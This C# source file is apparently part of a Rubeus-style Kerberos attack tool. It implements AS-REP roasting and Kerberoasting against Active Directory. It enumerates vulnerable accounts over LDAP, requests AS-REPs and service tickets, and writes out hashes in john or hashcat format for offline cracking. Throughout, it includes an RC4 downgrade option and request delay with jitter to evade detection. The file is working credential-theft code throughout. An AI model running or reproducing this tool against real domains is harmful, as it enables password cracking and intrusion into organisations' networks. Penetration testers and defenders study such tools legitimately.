using System;
using Asn1;
using System.IO;
using ConsoleTables;
using System.Text.RegularExpressions;
using System.Security.Principal;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.Collections.Generic;
using IRH.Kerberos.lib.Interop;

namespace IRH.Kerberos
{
    public class Roast
    {
        public static void ASRepRoast(string domain, string userName = "", string OUName = "", string domainController = "", string format = "john", System.Net.NetworkCredential cred = null, string outFile = "", string ldapFilter = "", bool ldaps = false, string supportedEType = "rc4")
        {
            if (!String.IsNullOrEmpty(userName))
            {
                Console.WriteLine("[*] Target User            : {0}", userName);
            }
            if (!String.IsNullOrEmpty(OUName))
            {
                Console.WriteLine("[*] Target OU              : {0}", OUName);
            }
            if (!String.IsNullOrEmpty(domain))
            {
                Console.WriteLine("[*] Target Domain          : {0}", domain);
            }
            if (!String.IsNullOrEmpty(domainController))
            {
                Console.WriteLine("[*] Target DC              : {0}", domainController);
            }

            Console.WriteLine();

            if (!String.IsNullOrEmpty(userName) && !String.IsNullOrEmpty(domain) && !String.IsNullOrEmpty(domainController))
            {
                GetASRepHash(userName, domain, domainController, format, outFile, supportedEType);
            }
            else
            {
                string userSearchFilter = "";

                if (String.IsNullOrEmpty(userName))
                {
                    userSearchFilter = "(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))";
                }
                else
                {
                    userSearchFilter = String.Format("(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName={0}))", userName);
                }
                if (!String.IsNullOrEmpty(ldapFilter))
                {
                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                }

                if (String.IsNullOrEmpty(domain))
                {
                    domain = System.DirectoryServices.ActiveDirectory.Domain.GetCurrentDomain().Name;
                }
                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, domainController, domain, userSearchFilter, ldaps);

                if (users == null)
                {
                    Console.WriteLine("[X] Error during executing the LDAP query.");
                    return;
                }
                if (users.Count == 0)
                {
                    Console.WriteLine("[X] No users found to AS-REP roast!");
                }

                foreach (IDictionary<string, Object> user in users)
                {
                    string samAccountName = (string)user["samaccountname"];
                    string distinguishedName = (string)user["distinguishedname"];
                    Interop.LDAPUserAccountControl userUAC = (Interop.LDAPUserAccountControl)user["useraccountcontrol"];
                    Console.WriteLine("[*] SamAccountName         : {0}", samAccountName);
                    Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                    if ((userUAC & Interop.LDAPUserAccountControl.USE_DES_KEY_ONLY) != 0)
                    {
                        Console.WriteLine("[*] User supports DES!");
                        if (!supportedEType.Equals("aes"))
                        {
                            supportedEType = "des";
                        }
                    }

                    GetASRepHash(samAccountName, domain, domainController, format, outFile, supportedEType);
                }
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));
            }
        }

        public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "", string supportedEType = "rc4")
        {
            string dcIP = Networking.GetDCIP(domainController, true, domain);
            if (String.IsNullOrEmpty(dcIP)) { return; }

            Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);

            byte[] reqBytes;
            byte[] response;
            AsnElt responseAsn;
            int responseTag;
            string requestedEType;

            if (supportedEType == "rc4" || supportedEType == "des")
            {
                Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.rc4_hmac;
                requestedEType = "rc4";
                if (supportedEType.Equals("des"))
                {
                    if (format == "john")
                    {
                        Console.WriteLine("[!] DES not supported for john format, please rerun with '/format:hashcat'");
                        return;
                    }
                    etype = Interop.KERB_ETYPE.des_cbc_md5;
                    requestedEType = "des";
                }
                reqBytes = AS_REQ.NewASReq(userName, domain, etype).Encode().Encode();
                response = Networking.SendBytes(dcIP, 88, reqBytes);

                if (response == null)
                {
                    return;
                }

                responseAsn = AsnElt.Decode(response, false);

                responseTag = responseAsn.TagValue;
            }
            else if (supportedEType == "aes")
            {
                Console.WriteLine("[*] Requesting AES128 (etype 17) as the encryption type");

                reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.aes128_cts_hmac_sha1).Encode().Encode();
                response = Networking.SendBytes(dcIP, 88, reqBytes);

                if (response == null)
                {
                    return;
                }

                requestedEType = "aes128";

                responseAsn = AsnElt.Decode(response, false);
                responseTag = responseAsn.TagValue;

                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                {
                    KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);

                    if (error.error_code == 14)
                    {
                        Console.WriteLine("[*] AES128 (etype 17) is not supported, attempting AES256 (etype 18) next");

                        reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.aes256_cts_hmac_sha1).Encode().Encode();
                        response = Networking.SendBytes(dcIP, 88, reqBytes);

                        if (response == null)
                        {
                            return;
                        }

                        requestedEType = "aes256";

                        responseAsn = AsnElt.Decode(response, false);
                        responseTag = responseAsn.TagValue;
                    }
                }
            }
            else
            {
                Console.WriteLine("No supported encryption types provided");
                return;
            }

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                Console.WriteLine("[+] AS-REQ w/o preauth successful!");

                AS_REP rep = new AS_REP(response);

                string repHash = BitConverter.ToString(rep.enc_part.cipher).Replace("-", string.Empty);

                string hashString = "";
                int checksumStart;

                if (format == "john")
                {
                    if (requestedEType == "aes128")
                    {
                        checksumStart = repHash.Length - 24;
                        hashString = String.Format("$krb5asrep$17${0}{1}${2}${3}", domain.ToUpper(), userName, repHash.Substring(0, checksumStart), repHash.Substring(checksumStart));
                    }
                    else if (requestedEType == "aes256")
                    {
                        checksumStart = repHash.Length - 24;
                        hashString = String.Format("$krb5asrep$18${0}{1}${2}${3}", domain.ToUpper(), userName, repHash.Substring(0, checksumStart), repHash.Substring(checksumStart));
                    }
                    else
                    {
                        repHash = repHash.Insert(32, "$");
                        hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
                    }
                }
                else if (format == "hashcat")
                {
                    if (requestedEType == "aes128")
                    {
                        checksumStart = repHash.Length - 24;
                        hashString = String.Format("$krb5asrep$17${0}${1}${2}${3}", userName, domain, repHash.Substring(checksumStart), repHash.Substring(0, checksumStart));
                    }
                    else if (requestedEType == "aes256")
                    {
                        checksumStart = repHash.Length - 24;
                        hashString = String.Format("$krb5asrep$18${0}${1}${2}${3}", userName, domain, repHash.Substring(checksumStart), repHash.Substring(0, checksumStart));
                    }
                    else if (requestedEType == "des")
                    {
                        int wholeLength = 193 + (domain.Length * 2);
                        byte[] knownPlain = { 0x79, 0x81, (byte)wholeLength, 0x30, 0x81, (byte)(wholeLength - 3), 0xA0, 0x13 };
                        hashString = Crypto.FormDESHash(repHash, knownPlain);
                    }
                    else
                    {
                        repHash = repHash.Insert(32, "$");
                        hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
                    }
                }
                else
                {
                    Console.WriteLine("Please provide a cracking format.");
                }

                if (!String.IsNullOrEmpty(outFile))
                {
                    string outFilePath = Path.GetFullPath(outFile);
                    try
                    {
                        File.AppendAllText(outFilePath, hashString + Environment.NewLine);
                    }
                    catch (Exception e)
                    {
                        Console.WriteLine("Exception: {0}", e.Message);
                    }
                    Console.WriteLine("[*] Hash written to {0}\r\n", outFilePath);
                }
                else
                {
                    Console.WriteLine("[*] AS-REP hash:\r\n");

                    if (Program.wrapTickets)
                    {
                        foreach (string line in Helpers.Split(hashString, 80))
                        {
                            Console.WriteLine("      {0}", line);
                        }
                    }
                    else
                    {
                        Console.WriteLine("      {0}", hashString);
                    }
                    Console.WriteLine();
                }
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            else
            {
                Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
            }
        }

        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, int delay = 0, int jitter = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false, bool ldaps = false, string nopreauth = null)
        {
            if (userStats)
            {
                Console.WriteLine("[*] Listing statistics about target users, no ticket requests being performed.");
            }
            else if (!String.IsNullOrWhiteSpace(nopreauth))
            {
                Console.WriteLine(String.Format("[*] Using {0} without pre-auth to request service tickets", nopreauth));
            }
            else if (TGT != null)
            {
                Console.WriteLine("[*] Using a TGT /ticket to request service tickets");
            }
            else if (useTGTdeleg || String.Equals(supportedEType, "rc4opsec"))
            {
                Console.WriteLine("[*] Using 'tgtdeleg' to request a TGT for the current user");
                byte[] delegTGTbytes = LSA.RequestFakeDelegTicket("", false);
                TGT = new KRB_CRED(delegTGTbytes);
                Console.WriteLine("[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else");
            }
            else
            {
                Console.WriteLine("[*] NOTICE: AES hashes will be returned for AES-enabled accounts.");
                Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n");
            }

            if ((enterprise) && ((TGT == null) || ((String.IsNullOrEmpty(spn)) && (spns != null) && (spns.Count == 0))))
            {
                Console.WriteLine("[X] To use Enterprise Principals, /spn or /spns has to be specified, along with either /ticket or /tgtdeleg");
                return;
            }

            if (delay != 0)
            {
                Console.WriteLine($"[*] Using a delay of {delay} milliseconds between TGS requests.");
                if (jitter != 0)
                {
                    Console.WriteLine($"[*] Using a jitter of {jitter}% between TGS requests.");
                }
                Console.WriteLine();
            }

            if (!String.IsNullOrEmpty(spn))
            {
                Console.WriteLine("\r\n[*] Target SPN             : {0}", spn);

                if (!String.IsNullOrWhiteSpace(nopreauth))
                {
                    GetTGSRepHash(nopreauth, spn, spn, "DISTINGUISHEDNAME", outFile, simpleOutput, dc, domain, Interop.KERB_ETYPE.rc4_hmac);
                }
                else if (TGT != null)
                {
                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
                }
                else
                {
                    GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
                }
            }
            else if ((spns != null) && (spns.Count != 0))
            {
                foreach (string s in spns)
                {
                    Console.WriteLine("\r\n[*] Target SPN             : {0}", s);

                    if (!String.IsNullOrWhiteSpace(nopreauth))
                    {
                        GetTGSRepHash(nopreauth, s, s, "DISTINGUISHEDNAME", outFile, simpleOutput, dc, domain, Interop.KERB_ETYPE.rc4_hmac);
                    }
                    else if (TGT != null)
                    {
                        GetTGSRepHash(TGT, s, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
                    }
                    else
                    {
                        GetTGSRepHash(s, "USER", "DISTINGUISHEDNAME", cred, outFile);
                    }
                }
            }
            else
            {
                if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(OUName)) || (!String.IsNullOrEmpty(userName)))
                {
                    if (!String.IsNullOrEmpty(userName))
                    {
                        if (userName.Contains(","))
                        {
                            Console.WriteLine("[*] Target Users           : {0}", userName);
                        }
                        else
                        {
                            Console.WriteLine("[*] Target User            : {0}", userName);
                        }
                    }
                    if (!String.IsNullOrEmpty(domain))
                    {
                        Console.WriteLine("[*] Target Domain          : {0}", domain);
                    }
                    if (!String.IsNullOrEmpty(OUName))
                    {
                        Console.WriteLine("[*] Target OU              : {0}", OUName);
                    }
                }

                if (TGT != null)
                {
                    byte[] kirbiBytes = null;
                    string ticketDomain = TGT.enc_part.ticket_info[0].prealm;

                    if (String.IsNullOrEmpty(domain))
                    {
                        domain = ticketDomain;
                    }

                    if (ticketDomain != domain)
                    {
                        if (String.IsNullOrEmpty(dc))
                        {
                            dc = Networking.GetDCName(domain);
                        }

                        string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
                        Ticket ticket = TGT.tickets[0];
                        byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;

                        Match match = Regex.Match(dc, @"([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(\d{1,3}\.){3}\d{1,3}");
                        if (match.Success)
                        {
                            System.Net.IPAddress dcIP = System.Net.IPAddress.Parse(dc);
                            System.Net.IPHostEntry dcInfo = System.Net.Dns.GetHostEntry(dcIP);
                            dc = dcInfo.HostName;
                        }

                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);
                    }
                    else
                    {
                        kirbiBytes = TGT.Encode().Encode();
                    }
                    LSA.ImportTicket(kirbiBytes, new LUID());
                }

                string userFilter = "";

                if (!String.IsNullOrEmpty(userName))
                {
                    if (userName.Contains(","))
                    {
                        string userPart = "";
                        foreach (string user in userName.Split(','))
                        {
                            userPart += String.Format("(samAccountName={0})", user);
                        }
                        userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
                    }
                    else
                    {
                        userFilter = String.Format("(samAccountName={0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2))", userName);
                    }
                }
                else
                {
                    userFilter = "(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))";
                }

                string encFilter = "";
                if (String.Equals(supportedEType, "rc4opsec"))
                {
                    Console.WriteLine("[*] Searching for accounts that only support RC4_HMAC, no AES");
                    encFilter = "(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                }
                else if (String.Equals(supportedEType, "aes"))
                {
                    Console.WriteLine("[*] Searching for accounts that support AES128_CTS_HMAC_SHA1_96/AES256_CTS_HMAC_SHA1_96");
                    encFilter = "(msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24)";
                }

                string userSearchFilter = "";
                if (!(String.IsNullOrEmpty(pwdSetAfter) & String.IsNullOrEmpty(pwdSetBefore)))
                {
                    if (String.IsNullOrEmpty(pwdSetAfter))
                    {
                        pwdSetAfter = "01-01-1601";
                    }
                    if (String.IsNullOrEmpty(pwdSetBefore))
                    {
                        pwdSetBefore = "01-01-2100";
                    }

                    Console.WriteLine("[*] Searching for accounts with lastpwdset from {0} to {1}", pwdSetAfter, pwdSetBefore);

                    try
                    {
                        DateTime timeFromConverted = DateTime.ParseExact(pwdSetAfter, "MM-dd-yyyy", null);
                        DateTime timeUntilConverted = DateTime.ParseExact(pwdSetBefore, "MM-dd-yyyy", null);
                        string timePeriod = "(pwdlastset>=" + timeFromConverted.ToFileTime() + ")(pwdlastset<=" + timeUntilConverted.ToFileTime() + ")";
                        userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1}{2})", userFilter, encFilter, timePeriod);
                    }
                    catch
                    {
                        Console.WriteLine("\r\n[X] Error parsing /pwdsetbefore or /pwdsetafter, please use the format 'MM-dd-yyyy'");
                        return;
                    }
                }
                else
                {
                    userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
                }

                if (!String.IsNullOrEmpty(ldapFilter))
                {
                    userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                }

                List<IDictionary<string, Object>> users = Networking.GetLdapQuery(cred, OUName, dc, domain, userSearchFilter, ldaps);
                if (users == null)
                {
                    Console.WriteLine("[X] LDAP query failed, try specifying more domain information or specific SPNs.");
                    return;
                }

                try
                {
                    if (users.Count == 0)
                    {
                        Console.WriteLine("\r\n[X] No users found to Kerberoast!");
                    }
                    else
                    {
                        Console.WriteLine("\r\n[*] Total kerberoastable users : {0}\r\n", users.Count);
                    }

                    SortedDictionary<Interop.SUPPORTED_ETYPE, int> userETypes = new SortedDictionary<Interop.SUPPORTED_ETYPE, int>();
                    SortedDictionary<int, int> userPWDsetYears = new SortedDictionary<int, int>();

                    foreach (IDictionary<string, Object> user in users)
                    {
                        string samAccountName = (string)user["samaccountname"];
                        string distinguishedName = (string)user["distinguishedname"];
                        string servicePrincipalName = ((string[])user["serviceprincipalname"])[0];


                        DateTime? pwdLastSet = null;
                        if (user.ContainsKey("pwdlastset"))
                        {
                            pwdLastSet = ((DateTime)user["pwdlastset"]).ToLocalTime();
                        }

                        Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
                        if (user.ContainsKey("msds-supportedencryptiontypes"))
                        {
                            supportedETypes = (Interop.SUPPORTED_ETYPE)(int)user["msds-supportedencryptiontypes"];
                        }

                        if (!userETypes.ContainsKey(supportedETypes))
                        {
                            userETypes[supportedETypes] = 1;
                        }
                        else
                        {
                            userETypes[supportedETypes] = userETypes[supportedETypes] + 1;
                        }

                        if (pwdLastSet == null)
                        {
                            if (!userPWDsetYears.ContainsKey(-1))
                                userPWDsetYears[-1] = 1;
                            else
                                userPWDsetYears[-1] += 1;
                        }
                        else
                        {
                            int year = pwdLastSet.Value.Year;
                            if (!userPWDsetYears.ContainsKey(year))
                                userPWDsetYears[year] = 1;
                            else
                                userPWDsetYears[year] += 1;
                        }

                        if (!userStats)
                        {
                            if (!simpleOutput)
                            {
                                Console.WriteLine("\r\n[*] SamAccountName         : {0}", samAccountName);
                                Console.WriteLine("[*] DistinguishedName      : {0}", distinguishedName);
                                Console.WriteLine("[*] ServicePrincipalName   : {0}", servicePrincipalName);
                                Console.WriteLine("[*] PwdLastSet             : {0}", pwdLastSet);
                                Console.WriteLine("[*] Supported ETypes       : {0}", supportedETypes);
                            }

                            if ((!String.IsNullOrEmpty(domain)) && (TGT == null))
                            {
                                servicePrincipalName = String.Format("{0}@{1}", servicePrincipalName, domain);
                            }
                            if (TGT != null)
                            {
                                Interop.KERB_ETYPE etype = Interop.KERB_ETYPE.subkey_keymaterial;
                                if (String.Equals(supportedEType, "rc4") &&
                                        (
                                            ((supportedETypes & Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES128_CTS_HMAC_SHA1_96) ||
                                            ((supportedETypes & Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96) == Interop.SUPPORTED_ETYPE.AES256_CTS_HMAC_SHA1_96)
                                        )
                                   )
                                {
                                    etype = Interop.KERB_ETYPE.rc4_hmac;
                                }

                                bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, etype);
                                Helpers.RandomDelayWithJitter(delay, jitter);
                                if (!result && autoenterprise)
                                {
                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, etype);
                                    Helpers.RandomDelayWithJitter(delay, jitter);
                                }
                            }
                            else
                            {
                                bool result = GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                                Helpers.RandomDelayWithJitter(delay, jitter);
                                if (!result && autoenterprise)
                                {
                                    Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
                                    servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
                                    GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                                    Helpers.RandomDelayWithJitter(delay, jitter);
                                }
                            }
                        }
                    }

                    if (userStats)
                    {
                        var eTypeTable = new ConsoleTable("Supported Encryption Type", "Count");
                        var pwdLastSetTable = new ConsoleTable("Password Last Set Year", "Count");
                        Console.WriteLine();

                        foreach (var item in userETypes)
                        {
                            eTypeTable.AddRow(item.Key.ToString(), item.Value.ToString());
                        }
                        eTypeTable.Write();

                        foreach (var item in userPWDsetYears)
                        {
                            pwdLastSetTable.AddRow(item.Key.ToString(), item.Value.ToString());
                        }
                        pwdLastSetTable.Write();
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex);
                    return;
                }
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                Console.WriteLine("[*] Roasted hashes written to : {0}", Path.GetFullPath(outFile));
            }
        }

        public static bool GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
        {
            string domain = "DOMAIN";

            if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
            {
                Match dnMatch = Regex.Match(distinguishedName, "(?<Domain>DC=.*)", RegexOptions.IgnoreCase);
                string domainDN = dnMatch.Groups["Domain"].ToString();
                domain = domainDN.Replace("DC=", "").Replace(',', '.');
            }

            try
            {
                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
                if (cred != null)
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                }
                else
                {
                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                }
                byte[] requestBytes = ticket.GetRequest();

                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                {
                    Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
                    return false;
                }

                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                AsnElt apRep = AsnElt.Decode(apReqBytes);

                if (apRep.TagValue != 14)
                {
                    Console.WriteLine("\r\n[X] Incorrect ASN application tag.  Expected 14, but got {0}.\r\n", apRep.TagValue);
                }

                long encType = 0;

                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        string hash = "";

                                        if ((encType == 18) || (encType == 17))
                                        {
                                            int checksumStart = cipherText.Length - 24;
                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        }
                                        else
                                        {
                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        }

                                        if (!String.IsNullOrEmpty(outFile))
                                        {
                                            string outFilePath = Path.GetFullPath(outFile);
                                            try
                                            {
                                                File.AppendAllText(outFilePath, hash + Environment.NewLine);
                                            }
                                            catch (Exception e)
                                            {
                                                Console.WriteLine("Exception: {0}", e.Message);
                                            }
                                            Console.WriteLine("[*] Hash written to {0}\r\n", outFilePath);
                                        }
                                        else if (simpleOutput)
                                        {
                                            Console.WriteLine(hash);
                                        }
                                        else
                                        {
                                            if (Program.wrapTickets)
                                            {
                                                bool header = false;
                                                foreach (string line in Helpers.Split(hash, 80))
                                                {
                                                    if (!header)
                                                    {
                                                        Console.WriteLine("[*] Hash                   : {0}", line);
                                                    }
                                                    else
                                                    {
                                                        Console.WriteLine("                             {0}", line);
                                                    }
                                                    header = true;
                                                }
                                            }
                                            else
                                            {
                                                Console.WriteLine("[*] Hash                   : {0}", hash);
                                            }
                                            Console.WriteLine();
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n [X] Error during request for SPN {0} : {1}\r\n", spn, ex.InnerException.Message);
                return false;
            }
            return true;
        }

        public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
        {
            string tgtDomain = "DOMAIN";

            string serviceName = TGT.tickets[0].sname.name_string[0];
            if (!serviceName.Equals("krbtgt"))
            {
                Console.WriteLine("[X] Unable to request service tickets without a TGT, please rerun and provide a TGT to '/ticket'.");
                return false;
            }
            else
            {
                tgtDomain = TGT.tickets[0].sname.name_string[1];
            }

            string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
            string domain = TGT.enc_part.ticket_info[0].prealm.ToLower();
            Ticket ticket = TGT.tickets[0];
            byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
            Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;

            byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false, false, null, tgtDomain);

            if (tgsBytes != null)
            {
                KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
                DisplayTGShash(tgsKirbi, true, userName, tgtDomain, outFile, simpleOutput);
                Console.WriteLine();
                return true;
            }

            return false;
        }

        public static bool GetTGSRepHash(string nopreauth, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, string domainController = "", string domain = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
        {
            AS_REQ NoPreAuthASREQ = AS_REQ.NewASReq(nopreauth, domain, requestEType, false, spn);
            byte[] reqBytes = NoPreAuthASREQ.Encode().Encode();

            string dcIP = Networking.GetDCIP(domainController, true, domain);
            if (String.IsNullOrEmpty(dcIP)) { return false; }

            byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);

            if (response == null)
            {
                return false;
            }

            AsnElt responseAsn = AsnElt.Decode(response);

            int responseTag = responseAsn.TagValue;

            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                AS_REP rep = new AS_REP(responseAsn);

                KRB_CRED cred = new KRB_CRED();

                cred.tickets.Add(rep.ticket);

                KrbCredInfo info = new KrbCredInfo();

                info.prealm = domain;

                info.pname.name_type = rep.cname.name_type;
                info.pname.name_string = rep.cname.name_string;

                info.srealm = domain;

                info.sname.name_type = NoPreAuthASREQ.req_body.sname.name_type;
                info.sname.name_string = NoPreAuthASREQ.req_body.sname.name_string;

                cred.enc_part.ticket_info.Add(info);

                DisplayTGShash(cred, true, userName, domain, outFile, simpleOutput);

                return true;
            }

            return false;
        }

        public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false, string desPlainText = "")
        {
            int encType = cred.tickets[0].enc_part.etype;
            string userName = string.Join("@", cred.enc_part.ticket_info[0].pname.name_string.ToArray());
            string domainName = cred.enc_part.ticket_info[0].prealm;
            string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());

            string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);

            string hash = "";
            if ((encType == 18) || (encType == 17))
            {
                int checksumStart = cipherText.Length - 24;
                hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
            }
            else if (encType == 3 && !string.IsNullOrWhiteSpace(desPlainText))
            {
                hash = Crypto.FormDESHash(cipherText, Helpers.StringToByteArray(desPlainText));
            }
            else
            {
                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
            }

            if (!String.IsNullOrEmpty(outFile))
            {
                string outFilePath = Path.GetFullPath(outFile);
                try
                {
                    File.AppendAllText(outFilePath, hash + Environment.NewLine);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception: {0}", e.Message);
                }
                Console.WriteLine("[*] Hash written to {0}", outFilePath);
            }
            else if (simpleOutput)
            {
                Console.WriteLine(hash);
            }
            else
            {
                bool header = false;
                if (Program.wrapTickets)
                {
                    foreach (string line in Helpers.Split(hash, 80))
                    {
                        if (!header)
                        {
                            if (kerberoastDisplay)
                            {
                                Console.WriteLine("[*] Hash                   : {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("  Kerberoast Hash          :  {0}", line);
                            }
                        }
                        else
                        {
                            if (kerberoastDisplay)
                            {
                                Console.WriteLine("                             {0}", line);
                            }
                            else
                            {
                                Console.WriteLine("                           {0}", line);
                            }
                        }
                        header = true;
                    }
                }
                else
                {
                    if (kerberoastDisplay)
                    {
                        Console.WriteLine("[*] Hash                   : {0}", hash);
                    }
                    else
                    {
                        Console.WriteLine("  Kerberoast Hash          :  {0}", hash);
                    }
                }
            }
        }
    }
}
